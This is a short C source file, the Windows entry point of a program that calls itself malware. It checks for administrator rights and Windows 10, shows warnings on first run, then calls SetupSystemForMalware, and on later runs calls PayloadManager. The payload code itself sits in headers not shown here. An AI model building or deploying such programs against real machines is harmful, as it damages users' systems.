#include "gdi.h"
#include "tools.h"
#include "setup.h"
#include "payloads.h"
#include <VersionHelpers.h>


INT wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd){
    if(!CheckIfAdministrator()){
        InstallerError(L"Please Run This as Administrator!");
        return 1;
    }
    if(!CheckIfWindows10OrGreater()){
        InstallerError(L"This Application Can Only run on Windows 10 or Higher\n");
        return 0;
    }
    SetupGDIElements();
    if(!CheckIfRan()){
        if(!DoWarnings()){
            FreeGDIElements();
            return 1;
        }
        SetupSystemForMalware();
    }
    else {  
        PayloadManager();
        FreeGDIElements();
        return 0;
    }
    FreeGDIElements();
    return 0;
}